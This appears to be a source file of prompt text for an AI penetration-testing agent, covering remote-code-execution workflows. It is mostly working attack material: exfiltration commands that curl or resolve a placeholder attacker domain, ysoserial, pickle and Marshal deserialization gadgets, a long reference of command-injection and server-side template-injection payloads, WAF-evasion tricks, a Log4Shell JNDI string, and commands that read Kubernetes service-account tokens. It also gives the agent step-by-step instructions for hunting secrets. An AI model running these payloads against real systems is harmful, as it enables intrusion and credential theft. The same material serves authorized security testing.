; powershell -c Resolve-DnsName ($env:USERNAME + '.REGISTERED_DOMAIN')
```

**SSTI engines that block backticks (use language-native HTTP):**
```
{{config.update(__import__('os').popen('curl http://REGISTERED_DOMAIN/$(id|base64 -w0)').read())}}   (Jinja2)
${<#assign x="freemarker.template.utility.Execute"?new()>${x("curl http://REGISTERED_DOMAIN/")}}     (Freemarker)
```

**Java deserialization (URLDNS gadget = pure DNS oracle, no payload exec):**
```
ysoserial URLDNS http://REGISTERED_DOMAIN > /tmp/payload.bin
# Then base64-encode and inject as the cookie/parameter
```

### Step 4: Poll for callbacks

```
kali_shell({"command": "tail -50 /tmp/interactsh.log"})
```

JSON lines you will see:
- `"protocol":"dns"` -> the subdomain prefix is the exfiltrated data
  - Example: `{"protocol":"dns","full-id":"www-data.abc123xyz.oast.fun"}` -> uid=www-data
- `"protocol":"http"` -> path/query carries the payload, base64-decode if needed
- `"remote-address"` -> the outbound IP of the target (often differs from the front-end IP)

Each protocol-DNS callback is Level 1 proof. Combined with extracted identity in
the subdomain prefix, that's Level 2.

### Step 5: Cleanup

```
kali_shell({"command": "kill SAVED_PID"})
kali_shell({"command": "rm /tmp/interactsh.log /tmp/payload.bin 2>/dev/null"})
```
"""


# =============================================================================
# DESERIALIZATION WORKFLOW (Java / PHP / Python / .NET / Ruby)
# =============================================================================

RCE_DESERIALIZATION_WORKFLOW = """
## Deserialization Workflow

**Use this when:** Step 2 surfaced a deserialization candidate (Java ViewState,
ASP.NET `__VIEWSTATE`, PHP serialized blob, Python pickle, Ruby Marshal, .NET
BinaryFormatter). Requires `RCE_DESERIALIZATION_ENABLED`=True.

The black-box deserialization workflow is: identify the format, generate a gadget,
inject, observe oracle.

---

### Format identification

Decode the suspect blob (cookie, header, body field):

```
echo "BLOB" | base64 -d | xxd | head -10
```

Magic bytes:
- `aced 0005` (or `\\xac\\xed`) -> **Java serialized object**
- `4f 3a 38 3a` (`O:8:`) or `61 3a 32 3a` (`a:2:`) -> **PHP serialized**
- `80 04` (or `80 02`/`80 03`/`80 05`) -> **Python pickle**
- `04 08` -> **Ruby Marshal**
- `7b "_v" :` (JSON) with `_v_/_t_` keys -> **JSON.NET TypeNameHandling**
- ASP.NET `__VIEWSTATE=/wEP...` (base64) -> **.NET BinaryFormatter / LosFormatter**

### Java deserialization (ysoserial)

`ysoserial` is preinstalled in kali_shell (`/usr/bin/ysoserial`). Generate a
gadget chain matching the target's classpath. Common chains and when to use them:

| Chain | Library required on target | Typical apps |
|-------|---------------------------|--------------|
| `URLDNS` | none (just JDK) | Universal blind oracle (DNS only, no exec) |
| `CommonsCollections1` | commons-collections <= 3.2.1 | Old Java EE apps |
| `CommonsCollections6` | commons-collections 3.x or 4.x | Most current targets |
| `CommonsCollections7` | commons-collections | Newer JDKs |
| `CommonsBeanutils1` | commons-beanutils | Spring stack |
| `Spring1` | spring-core | Spring Boot apps |
| `Hibernate1` / `Hibernate2` | hibernate | JPA / Hibernate apps |
| `JRE8u20` | none | Native JDK 8 only (rare success) |
| `Click1` | Apache Click | Legacy Click framework |

Workflow:

```
# Step 1: confirm reachability with URLDNS (no library required)
kali_shell({"command": "ysoserial URLDNS http://REGISTERED_DOMAIN > /tmp/urldns.bin"})
kali_shell({"command": "base64 -w0 /tmp/urldns.bin"})
# Inject the base64 as the cookie/param/header. Watch interactsh for DNS hit.

# Step 2: once DNS fires, escalate to a real chain
kali_shell({"command": "ysoserial CommonsCollections6 'curl http://REGISTERED_DOMAIN/$(id|base64 -w0)' > /tmp/cc6.bin"})
kali_shell({"command": "base64 -w0 /tmp/cc6.bin"})

# Step 3: if commons-collections is unavailable but Spring is, swap chains:
kali_shell({"command": "ysoserial Spring1 'id' > /tmp/spring.bin"})
```

Inject via execute_curl, encoding as the channel requires (cookie often needs
URL-encoding of `+`, `=`, `/`).

### .NET deserialization

`ysoserial.net` is NOT preinstalled. If `KALI_INSTALL_ENABLED`=True, request install
via the kali install flow. Otherwise, hand-craft via `execute_code` (PowerShell
gadget generation in pwsh) or skip in favor of another primitive.

`__VIEWSTATE` without MAC -> use ysoserial.net `TextFormattingRunProperties` gadget.

### PHP deserialization (manual; phpggc not preinstalled)

Hand-craft a payload using `execute_code` (Python harness). Look up the target
framework's gadget chain (laravel, symfony, magento, wordpress, joomla, drupal):

```python
# example placeholder; replace with the framework-specific gadget chain
payload = 'O:8:"stdClass":1:{s:1:"x";s:0:"";}'
import base64
print(base64.b64encode(payload.encode()).decode())
```

Inject as cookie or POST body. Confirm via OOB.

**When no framework gadget fits -- look for the app's OWN gadget class.** If the
target does not autoload a known framework's vulnerable classes, a `phpggc` /
framework chain will never fit -- but that does NOT mean the sink is unexploitable,
and it is NOT evidence that "only built-in objects are reachable". Applications very
commonly define their own class with a dangerous magic method, and an unserialize
sink very often type-checks its result: an `instanceof SomeClass` gate, or an error
like "invalid object type", NAMES the exact class the sink expects -- and any class
the sink checks for is loaded server-side and IS your gadget target. Do not conclude
"no usable gadget" until you have recovered the application's own source.
- **Recover the app's classes + magic methods.** Hunt for source-code or backup-artifact disclosure to
  learn the app's class names and their magic methods (`__wakeup` / `__destruct` /
  `__toString` / `__call`, or any method the sink itself then invokes on the object):
  exposed backup or editor artifacts (`.bak` / `~` / `.old` / `.orig` / `.swp` files,
  backup directories), an exposed `.git`, config/include leaks, and verbose errors or
  stack traces that name files or classes. This is the step most often missed when a
  deserialization sink is CONFIRMED yet "no gadget" seems to apply.
- **When you FIND a disclosure surface, EXTRACT the raw source -- do not blind-guess
  class names.** A source-, backup-, or config-disclosure endpoint that returns rendered HTML, a wrapper
  page, a redirect, or a `404` for your first guess is NOT exhausted. Pull the RAW file:
  append the script names you already know exist to the disclosure path, request a
  directory index, and above all read the source of the VERY sink/script you are already
  attacking plus whatever it `include`s / `require`s -- try each with and without common
  backup suffixes. The sink's own source is the jackpot: it literally spells out the class
  the object-type check expects, that class's properties, and the exact method that fires
  the payload -- everything the gadget needs. Reading one retrievable source file beats any
  amount of class-name guessing; treat blind/combinatorial class-name brute-forcing as a
  LAST resort only after raw-source retrieval has genuinely failed, never as a substitute
  for reading a disclosure surface you have already located.
  When you fetch through a disclosure surface, read the RAW BYTES, not a rendered view: a
  `200` that shows only a page shell, a formatted/highlighted listing, or no code at all
  means you got the RENDERED output, not the source. Re-request it as raw -- a `.bak` /
  `.txt` / `~` suffix, a `?raw` / view-source-style parameter the endpoint accepts, a
  `phar://` / `file://` / `php://filter` wrapper, or the file one directory level up -- and
  judge success ONLY by grepping the bytes you received for structural tokens (`<?php`,
  `class `, `function `, `instanceof`, `require` / `include`), never by whether the browser
  view superficially looks like source. A disclosure attempt that returned none of those
  tokens has NOT been tried properly and must not be marked exhausted.
- **Confirm a class is loaded with the deserialize oracle.** Unserializing a class name
  the server knows yields a full object; an unknown name yields `__PHP_Incomplete_Class`.
  Use that differential to verify a candidate class is actually loaded before investing
  in the full payload.
- **Then build it:** serialize an instance of THAT class with attacker-controlled
  properties that reach its dangerous method, deliver it through the same sink (for a
  `phar://` sink, as the archive's serialized metadata/manifest), and trigger it.

### Python pickle

If the target accepts a pickle (e.g. legacy `pickle.loads(request.cookies['data'])`),
generate via `execute_code`:

```python
import pickle, base64, os
class P:
    def __reduce__(self):
        return (os.system, ('curl http://REGISTERED_DOMAIN/$(id|base64 -w0)',))
payload = base64.b64encode(pickle.dumps(P())).decode()
print(payload)
```

### Ruby Marshal

```
kali_shell({"command": "ruby -rerb -e 'puts [Marshal.dump(ERB.new(\\"<%=`id`%>\\"))].pack(\\"m0\\")'"})
```

Less common; only when `Marshal.load` is reachable from user input.

### Cross-format detection probe

If you cannot identify the format from magic bytes, send each format's "harmless"
probe and watch for distinct error fingerprints:

| Probe | Triggers if |
|-------|-------------|
| `aced0005737200000000` (truncated Java) | Java serialization (StreamCorruptedException) |
| `O:1:"X":0:{}` (PHP) | PHP unserialize (ErrorException about class) |
| `\\x80\\x04N.` (Python pickle None) | Python pickle (UnpicklingError or KeyError) |
| `\\x04\\x08T` (Ruby Marshal true) | Ruby Marshal (TypeError) |

Distinct error pages = format confirmed even before gadget chain selection.
"""


# =============================================================================
# RCE PAYLOAD REFERENCE (appended raw, single braces)
# =============================================================================

RCE_PAYLOAD_REFERENCE = """
## RCE Payload Reference

Look up by primitive identified in Step 4. Always test the smallest/quietest
payload first; only escalate complexity if the simple one is filtered.

### Command Injection -- Unix shell metacharacters

Separators (try in this order, low->high noise):
```
;id
|id
&&id
||id
`id`
$(id)
%0aid                                    (newline; URL-encoded LF)
%0did                                    (CR)
${IFS}id                                 (IFS-spaced; bypasses space filters)
```

Argument injection (when input lands in a CLI flag):
```
--output=/tmp/x ; id
" --version "; id; "
-oProxyCommand=`id`             (ssh client argument injection)
```

Path / builtin confusion:
```
/usr/bin/id                              (absolute path; bypasses PATH manipulation)
/???/??t /???/p?sswd                     (glob to read /etc/passwd via cat; busybox)
```

Whitespace evasion:
```
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
{cat<>/etc/passwd}
```

Token splitting:
```
w'h'o'a'm'i
w"h"o"a"m"i
w\\h\\o\\a\\m\\i
$@\\u0069d                              (Bash $@ + escaped 'i')
```

Variable building (when chars are blacklisted):
```
a=i;b=d;$a$b
a=$'\\x69\\x64';$a
$0<<<$0\\<\\<\\<id                       (heredoc-via-bash)
```

Base64 stagers (when payload chars are filtered):
```
echo aWQ= | base64 -d | sh
$(echo aWQ= | base64 -d | sh)
```

### Command Injection -- Windows

CMD:
```
& whoami
| whoami
& dir &
&& whoami
^& whoami
& net user &
```

PowerShell:
```
; Get-Process
; iex (iwr http://REGISTERED_DOMAIN/x.ps1)
; [Convert]::FromBase64String('cG93ZXJzaGVsbA==') | %{$_}
```

UAC-aware quote bypass:
```
"&whoami&"
")&whoami&("
```

### SSTI by engine

**Jinja2 (Python: Flask, Django when configured)**
```
{{7*7}}                                    -> 49
{{7*'7'}}                                  -> 7777777
{{config}}                                 -> dumps Flask config (often has SECRET_KEY)
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
```

**Twig (PHP)**
```
{{7*7}}                                    -> 49
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{['id']|filter('system')}}
{{['id']|map('system')|join(',')}}
```

**Freemarker (Java)**
```
${7*7}                                                                                  -> 49
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder",["/bin/sh","-c","id"]).start()}
```

**Velocity (Java)**
```
#set($x="")##
#set($rt=$x.class.forName("java.lang.Runtime"))##
#set($chr=$x.class.forName("java.lang.Character"))##
#set($str=$x.class.forName("java.lang.String"))##
#set($ex=$rt.getMethod("exec",[$str]).invoke($rt.getMethod("getRuntime").invoke(null),"id"))
$ex.waitFor()
```

**EJS (Node.js)**
```
<%= global.process.mainModule.require('child_process').execSync('id') %>
<%= 7*7 %>                                    -> 49 (probe)
```

**Handlebars (Node.js)**
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Thymeleaf (Java/Spring)**
```
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

**Logic-less / sandboxed engines (arithmetic does NOT evaluate -- this is expected, NOT "no SSTI")**

These engines do not compute `7*7`; a non-`49` result is NOT proof the sink is inert.
Confirm them by their own variable/tag facility. What is reachable depends on the engine:
pure logic-less engines (Mustache) expose only data already in scope, while others
(Handlebars via prototype gadgets, Go) can escalate. Treat data disclosure and code
execution as co-equal outcomes and pursue whichever the engine allows.
```
Django templates (Python/Django) -- SANDBOXED
{% debug %}                          -> dumps the ENTIRE render context (read it for secrets)
{{ known_context_var }}              -> renders any variable the view passed to the template
{% for k, v in some_dict.items %}{{ k }}={{ v }}{% endfor %}
  Do NOT expect {{7*7}} to work here; Django templates raise TemplateSyntaxError on it (often
  swallowed by an app catch-all -> blank page or redirect). __class__ object traversal is
  not available on Django templates; assess impact from what the engine actually exposes
  rather than assuming either outcome.

  PUBLIC-ATTRIBUTE GADGET WALK (when tag/statement syntax AND dunder are BOTH filtered):
  a sandboxed engine whose {% %}-style tags (and {% debug %}) are unavailable, and whose _-prefixed
  attributes are blocked, has NOT closed the variable-expression graph. You can still descend the
  PUBLIC (non-underscore) attribute/index chain of EVERY object the context exposes -- dump EACH
  root object to see what it is (the framework's own request/response/session/user objects and
  whatever else is in scope), not only the app's own variables. Framework internals reached this
  way often hold a secret the app never passed into the template -- application configuration,
  cryptographic or session material, serializers, and cache/storage/connection state are the usual
  homes. Method (enumerate, do not guess):
  dump each root object -> read the public attribute/index names it prints -> descend ONE public
  hop at a time ( {{ ROOT.pubA.INDEX.pubB }} ... ) -> diff what each hop returns -> continue
  until a config- or secret-bearing internal surfaces. Map the chain from what actually prints;
  there is no single canonical path -- it depends on which objects THIS context exposes.
  CRITICAL -- an OPAQUE object repr is an EXPAND node, NOT a dead end. Most framework objects print
  as `<SomeClassName ...>` and do NOT list their own attributes, and a sandboxed template gives you
  no dir()/vars() to enumerate them. So a `<X object>` repr (or an empty render) at a hop is NOT
  evidence of "nothing here" -- the useful children are simply hidden behind the repr. Expand such
  a node WITHOUT introspection by: (a) INDEXING it as a sequence -- try `.0`, `.1`, `.2` -- in case
  it is a list / tuple / collection of children; (b) using the CLASS NAME shown in its repr as the
  lead (you read that name from the LIVE output, so it needs no prior app knowledge): look up or
  infer that class's documented PUBLIC attributes and try each as the next hop; (c) descending
  through EVERY wrapper child even when the child's own repr is ALSO opaque. The secret usually sits
  2-5 PUBLIC hops deep behind one or more opaque wrapper objects, so a depth-1 dump of a root object
  is NEVER sufficient -- you may not declare a root object exhausted (or say "no secret reachable
  here") until every opaque child it exposes has itself been expanded by (a)+(b)+(c).

  AUTOMATE THIS WALK AS ONE SCRIPT -- do NOT do it hop-by-hop across separate tool calls. The walk
  is a breadth-first search over potentially hundreds of expressions, each one needing the full
  request sequence to your reflected sink; done by hand you lose the queue, repeat yourself, and
  stall out before the deep hop. Instead write a SINGLE `execute_code` harness that owns the entire
  traversal: (1) a `render(expr)` helper that drives the exact request flow to your confirmed sink
  -- reusing the session/auth and any multi-step sequence you already proved -- and returns the
  reflected output for one expression; (2) a work queue seeded with the in-scope root variables (the
  framework's default context / context-processor names, plus any roots you observed rendering);
  (3) a loop that pops a node, builds its child expressions -- integer indices .0 .. .N AND a list
  of candidate PUBLIC attribute names you assemble (generic framework-internal names, plus the class
  names you read out of the live opaque reprs) -- and calls `render()` on each; (4) classify each
  result: parse-error or empty -> prune; a NEW opaque object repr -> push that child (bound depth to
  ~5, keep a visited set to avoid cycles); a scalar/string -> record it as a leaf; (5) match every
  leaf against your objective pattern and print the winning expression path and its value.
  Constrain every generated expression to the EXACT syntax the target proved it accepts (only the
  characters and forms that survived your filter probes). The script's mechanical discipline --
  never skipping a child, never losing the queue -- is what reaches a secret buried several hops
  deep; let the script DISCOVER the path, never hard-code one.

Handlebars (Node)   {{this}} / {{#each this}}{{@key}}={{this}}{{/each}}   (data; escalate via prototype gadget)
Mustache (many)     {{.}} / {{#section}}...{{/section}}                    (pure logic-less -> data disclosure only)
Liquid (Ruby)       {{ page }} / {{ site }} / {{ settings }} / {% assign %}
Go text/template    {{ . }} prints the whole data object; {{ printf "%d" 49 }}
```

**Data-disclosure primitives**

Many engines expose data already in the render context; enumerate it as one avenue
alongside any code-execution path:
```
Jinja2 / Flask : {{ config }}   (Flask config, often SECRET_KEY)    {{ self.__dict__ }}
Twig           : {{ _context }} (all template vars)                 {{ dump() }} (Debug extension)
Django         : {% debug %}    {{ context_var }}
Any engine     : a secret/credential surfaced from the render context is a complete,
                 reportable win -- no code execution needed.
```

**Pug (Node.js)**
```
#{ root.process.mainModule.require('child_process').execSync('id') }
```

**ERB (Ruby)**
```
<%= `id` %>
<%= IO.popen('id').read %>
<%= system('id') %>
```

### Eval / expression languages

**OGNL (Struts 2)**
```
%{(#a=@java.lang.Runtime@getRuntime().exec('id')).getInputStream()}
```

**SpEL (Spring)**
```
T(java.lang.Runtime).getRuntime().exec('id')
new ProcessBuilder({'sh','-c','id'}).start()
```

**MVEL (Drools)**
```
import java.lang.Runtime; Runtime.getRuntime().exec('id');
```

**JS eval (Node.js)**
```
require('child_process').execSync('id').toString()
process.mainModule.require('child_process').execSync('id')
global.process.mainModule.require('child_process').execSync('id')
```

**Python eval / exec**
```
__import__('os').popen('id').read()
__import__('subprocess').check_output(['id'])
().__class__.__bases__[0].__subclasses__()[<idx>](['id'])    (find Popen subclass)
```

### WAF bypass quick reference

| Technique | Example | Use when |
|-----------|---------|----------|
| URL encode | `%3B%69%64` for `;id` | Special chars blocked |
| Double URL | `%253B%2569%2564` | Single-decode WAF |
| Unicode | `\\u003bid` (in JS context) | Unicode-aware filter |
| Comment break | `i/**/d` (in SQL/SSTI) | Keyword blacklist |
| Glob expand | `/???/??t` for `/bin/cat` | `/etc/`, `cat` blacklisted |
| Wildcard binary | `/bin/c?t` | Char-level blacklist |
| Base64 stager | `echo Y2F0... | base64 -d | sh` | All cmd chars blocked |
| Variable | `a=ca;b=t;$a$b /etc/passwd` | Keyword blacklist |
| Reverse string | `$(rev<<<'i d')` | Heuristic content match |
| Hex escape | `$'\\x69\\x64'` | Char-level filter |
| Tab / CR | `%09`, `%0d` instead of space | Space-only stripping |

### CVE / N-day RCE quick checks (run via execute_nuclei FIRST)

```
execute_nuclei({"args": "-u http://TARGET -tags rce,oast -severity critical,high -timeout 10"})
execute_nuclei({"args": "-u http://TARGET -tags log4j -timeout 10"})            # Log4Shell
execute_nuclei({"args": "-u http://TARGET -tags spring4shell -timeout 10"})      # Spring4Shell
execute_nuclei({"args": "-u http://TARGET -tags struts -timeout 10"})            # Struts OGNL
```

Common patterns to check manually:
- **Log4Shell (CVE-2021-44228):** `${jndi:ldap://REGISTERED_DOMAIN/x}` in any header
  (User-Agent, Referer, X-Forwarded-For, X-Api-Version), URL param, or POST body.
- **Spring4Shell (CVE-2022-22965):** Spring-MVC binding -> class.module.classLoader.*
  POST `class.module.classLoader.URLs[0]=...`.
- **CVE-2017-5638 (Struts S2-045):** `Content-Type` header with `%{(#cmd='id')...}`.
- **Ghostscript -dSAFER bypass:** any pre-2018 Ghostscript on PDF/PS uploads.
- **ImageMagick MSL/MVG (ImageTragick):** convert any user image with crafted MVG.

### Container / Kubernetes RCE pivots (post-Level-3)

Run only after confirming the target IS containerized via Step 5:

```
;ls -la /.dockerenv
;cat /proc/1/cgroup | grep -E 'docker|kubepods'
```

Container indicators -> attempt:

```
# docker.sock mounted in container
;test -S /var/run/docker.sock && echo MOUNTED

# k8s service account
;cat /var/run/secrets/kubernetes.io/serviceaccount/token
;cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
;curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\
  https://kubernetes.default.svc/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/pods

# kubelet on host (10250 read-only port deprecated; 10250 still serves /pods)
;curl -k https://NODE_IP:10250/pods

# Privileged container check
;capsh --print 2>/dev/null | grep -i 'cap_sys_admin\\|cap_net_admin\\|cap_dac_'
```

Document the escape vector found WITHOUT executing it unless `RCE_AGGRESSIVE_PAYLOADS`
is True.
"""
